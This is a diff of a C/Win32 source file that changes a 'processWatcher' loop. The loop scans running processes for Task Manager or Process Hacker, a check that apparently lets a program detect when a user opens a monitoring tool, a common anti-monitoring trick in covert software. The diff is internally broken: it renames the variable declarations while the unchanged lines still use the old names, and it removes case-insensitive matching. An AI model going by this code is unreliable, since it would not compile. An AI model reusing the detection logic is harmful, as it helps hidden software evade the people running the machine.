@@ -1,9 +1,8 @@
 #include "header.h"
 
 void processWatcher() {
-	PROCESSENTRY32 peProcessEntry;
-	wchar_t Process[255];
-	HANDLE hSnapshot = NULL;
+	PROCESSENTRY32 pe;
+	HANDLE hSnap = NULL;
 
 
 	while (TRUE)
@@ -19,14 +18,7 @@ void processWatcher() {
 		peProcessEntry.dwSize = sizeof(PROCESSENTRY32);
 		Process32First(hSnapshot, &peProcessEntry);
 		do {
-			wcscpy_s(Process, 255, peProcessEntry.szExeFile);
-
-			for (int i = 0; i < wcslen(Process); i++)
-			{
-				Process[i] = towlower(Process[i]);
-			}
-
-			if ((!wcscmp(Process, L"taskmgr.exe")) || (!wcscmp(Process, L"processhacker.exe")))
+			if ((!wcscmp(pe.szExeFile, L"taskmgr.exe")) || (!wcscmp(pe.szExeFile, L"processhacker.exe")))
 			{
 				CloseHandle(hSnapshot);
 				//MessageBox(NULL, L"DETECTED Task manager!!! Close process!!", L"Info", MB_ICONEXCLAMATION);
